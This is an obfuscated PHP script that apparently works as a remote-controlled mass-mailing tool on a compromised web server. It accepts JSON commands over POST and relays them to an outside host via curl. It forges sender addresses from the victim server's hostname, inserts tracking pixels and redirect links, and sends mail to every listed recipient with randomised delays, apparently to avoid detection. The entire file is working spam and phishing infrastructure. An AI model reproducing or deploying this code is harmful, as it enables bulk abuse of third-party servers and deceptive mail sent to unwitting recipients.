<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp13ec04) { if ($sp13ec04 == 'keys') { return array_keys($this->_keys); } } public function Import($sp13ec04, $spe4865c) { if (is_array($spe4865c)) { $this->values[$sp13ec04] = array(); foreach ($spe4865c as $spfc0471) { if (!empty($spfc0471['key'])) { $this->values[$sp13ec04][$spfc0471['key']] = $spfc0471['value']; } else { $this->values[$sp13ec04][] = $spfc0471['value']; } } } else { $this->Assign($sp13ec04, $spe4865c); } } public function Assign($sp13ec04, $sp05e8e0) { $this->values[$sp13ec04] = $sp05e8e0; } public function Parse($sp2628e0) { $sp159cd7 = ''; $sp72c867 = 0; while (true) { $sp4baada = strpos($sp2628e0, '{', $sp72c867); if ($sp4baada === false) { $sp159cd7 .= substr($sp2628e0, $sp72c867); break; } $sp159cd7 .= substr($sp2628e0, $sp72c867, $sp4baada - $sp72c867); $sp72c867 = $sp4baada + 1; $sp5a9a2a = ''; $spd8c895 = '{'; $spb01b35 = array(); $spda5844 = false; $sp9f505d = false; $sp61724c = 'var'; while ($sp72c867 < strlen($sp2628e0)) { $spa0b7ba = substr($sp2628e0, $sp72c867, 1); $spd8c895 .= $spa0b7ba; if ($spa0b7ba == ',' || $spa0b7ba == '>' || $spa0b7ba == '|') { if ($sp61724c == 'alias') { $spda5844 = $sp5a9a2a; } elseif ($sp61724c == 'mod') { $sp9f505d = $sp5a9a2a; } else { $spb01b35[] = $sp5a9a2a; } $sp5a9a2a = ''; if ($spa0b7ba == '>') { $sp61724c = 'alias'; } if ($spa0b7ba == '|') { $sp61724c = 'mod'; } $sp72c867++; continue; } if ($spa0b7ba == '}') { if ($sp61724c == 'alias') { $spda5844 = $sp5a9a2a; } elseif ($sp61724c == 'mod') { $sp9f505d = $sp5a9a2a; } else { $spb01b35[] = $sp5a9a2a; } $sp72c867++; break; } $sp5a9a2a .= $spa0b7ba; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spa0b7ba) == 0) { $sp72c867++; $spb01b35 = array(); break; } $sp72c867++; } if (sizeof($spb01b35) == 0) { $sp159cd7 .= $spd8c895; continue; } $sp2894e4 = false; $sp8271a5 = false; if (preg_match('/^\\^/', $spb01b35[0]) > 0) { $spb01b35[0] = substr($spb01b35[0], 1); $sp2894e4 = true; } if (preg_match('/^\\!/', $spb01b35[0]) > 0) { $spb01b35[0] = substr($spb01b35[0], 1); $sp8271a5 = true; } $spa6fea4 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spb01b35[0], $sp1ef93e) > 0) { $spa6fea4 = $sp1ef93e[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spb01b35[0], $sp1ef93e) > 0) { $spa6fea4 = explode('-', $sp1ef93e[1]); } if ($spa6fea4 !== false) { $spb01b35[0] = substr($spb01b35[0], 0, strpos($spb01b35[0], '[')); } $this->_keys[$spb01b35[0]] = true; if (empty($this->values[$spb01b35[0]]) && empty($this->fixed[$spb01b35[0]])) { continue; } if ($sp2894e4) { unset($this->fixed[$spb01b35[0]]); } if (isset($this->fixed[$spb01b35[0]])) { $sp6e6641 = $this->fixed[$spb01b35[0]]; } else { $sp6e6641 = ''; $spe01682 = 1; if (sizeof($spb01b35) == 2) { $spe01682 = $spb01b35[1]; } if (sizeof($spb01b35) == 3) { $spe01682 = rand($spb01b35[1], $spb01b35[2]); } for ($sp66c0fb = 0; $sp66c0fb < $spe01682; $sp66c0fb++) { if (is_array($this->values[$spb01b35[0]])) { if (!is_array($this->used[$spb01b35[0]])) { $this->used[$spb01b35[0]] = array(); } if (count($this->used[$spb01b35[0]]) == count($this->values[$spb01b35[0]])) { $this->used[$spb01b35[0]] = array(); } if ($spa6fea4 !== false && is_scalar($spa6fea4)) { $sp6e6641 .= $this->values[$spb01b35[0]][$spa6fea4]; $this->used[$spa6fea4] = true; } else { $sp5c2da9 = array(); if (is_array($spa6fea4)) { $sp3dfec4 = $spa6fea4[0]; $sp375393 = $spa6fea4[1]; } else { $sp3dfec4 = 0; $sp375393 = count($this->values[$spb01b35[0]]) - 1; } for ($spbfd60e = $sp3dfec4; $spbfd60e <= $sp375393; $spbfd60e++) { if ($sp8271a5 && !empty($this->used[$spb01b35[0]][$spbfd60e])) { continue; } $sp5c2da9[] = $spbfd60e; } $spde7966 = $sp5c2da9[rand(0, count($sp5c2da9) - 1)]; $this->used[$spb01b35[0]][$spde7966] = true; $sp6e6641 .= $this->values[$spb01b35[0]][$spde7966]; } } else { $sp6e6641 .= $this->values[$spb01b35[0]]; } } } $sp6e6641 = $this->Parse($sp6e6641); if ($sp9f505d !== false) { for ($spcc1206 = 0; $spcc1206 < strlen($sp9f505d); $spcc1206++) { switch (substr($sp9f505d, $spcc1206, 1)) { case 'b': $sp6e6641 = base64_encode($sp6e6641); break; case 'q': $sp6e6641 = quoted_printable_encode($sp6e6641); break; default: break; } } } if ($sp2894e4) { $this->fixed[$spb01b35[0]] = $sp6e6641; } if ($spda5844 !== false && $spda5844 != '') { $this->fixed[$spda5844] = $sp6e6641; } $sp159cd7 .= $sp6e6641; } return $sp159cd7; } } $spe41cd1 = file_get_contents('php://input'); $sp2a8f24 = json_decode($spe41cd1, true); if (empty($sp2a8f24['via_proxy'])) { $sp2a8f24['via_proxy'] = true; $spb83346 = curl_init($sp2a8f24['prefix'] . $sp2a8f24['files']['s']); $spfc7715 = json_encode($sp2a8f24); curl_setopt($spb83346, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spb83346, CURLOPT_TIMEOUT, 600); curl_setopt($spb83346, CURLOPT_RETURNTRANSFER, true); curl_setopt($spb83346, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spb83346, CURLOPT_REFERER, $spb9f06c); curl_setopt($spb83346, CURLOPT_POST, true); curl_setopt($spb83346, CURLOPT_POSTFIELDS, $spfc7715); curl_setopt($spb83346, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spfc7715))); $sp8607d0 = curl_exec($spb83346); echo $sp8607d0; die; } $spdfbc70 = $_SERVER['SERVER_ADDR']; $sp4663f6 = $_SERVER['HTTP_HOST']; $sp4663f6 = preg_replace('/^www\\./', '', $sp4663f6); $spe8f72f = new Macros(); $spe8f72f->Assign('server_addr', $spdfbc70); $spe8f72f->Assign('server_host', $sp4663f6); foreach ($sp2a8f24['macros'] as $sp13ec04 => $spe4865c) { $spe8f72f->Import($sp13ec04, $spe4865c); } $sp899d00 = preg_replace('/^www\\./i', '', $sp4663f6); $sp62a4cc = $spe8f72f->Parse('{from_user}@' . $sp899d00); $spe8f72f->Assign('from_email', $sp62a4cc); $spe8f72f->Assign('prefix', $sp2a8f24['prefix']); $spe8f72f->Assign('html', $sp2a8f24['letter']['html']); $sp72c867 = 0; $sp5aed00 = 0; $sp51014b = 0; $sp0e09a1 = array(); foreach ($sp2a8f24['rcpt'] as $sp5f48a9) { $spe8f72f->Assign('email', $sp5f48a9['email']); $spe8f72f->Assign('entry', $sp5f48a9); $spe8f72f->Assign('date', date('r')); $spe8f72f->Assign('redirect', $sp2a8f24['prefix'] . $sp2a8f24['files']['r']); $spe8f72f->Assign('redirect_with_uri', $sp2a8f24['prefix'] . $sp2a8f24['files']['r'] . '?uri='); $spe8f72f->Assign('unsubscribe', $sp2a8f24['prefix'] . $sp2a8f24['files']['u'] . '?id=' . $sp5f48a9['id']); $spe8f72f->Assign('delivery', '<img src="' . $sp2a8f24['prefix'] . $sp2a8f24['files']['d'] . '?id=' . $sp5f48a9['id'] . '" />'); $sp6d4146 = $spe8f72f->Parse($sp2a8f24['envelope']['header']); $sp092a25 = $spe8f72f->Parse($sp2a8f24['envelope']['body']); if (!empty($sp5f48a9['name'])) { $sp60d858 = $sp5f48a9['name'] . ' <' . $sp5f48a9['email'] . '>'; } else { $sp60d858 = $sp5f48a9['email']; } $sp815c3e = $spe8f72f->Parse($sp2a8f24['letter']['subject']); if ($sp72c867 > 0) { sleep(rand(3, 8)); } $sp32439c = mail($sp60d858, $sp815c3e, $sp092a25, $sp6d4146); $sp0e09a1[$sp5f48a9['id']] = $sp32439c; if ($sp32439c) { $sp5aed00++; } else { $sp51014b++; } $sp72c867++; } echo serialize(array('total' => count($sp2a8f24['rcpt']), 'sent' => $sp72c867, 'success' => $sp5aed00, 'error' => $sp51014b, 'rcpt' => $sp0e09a1));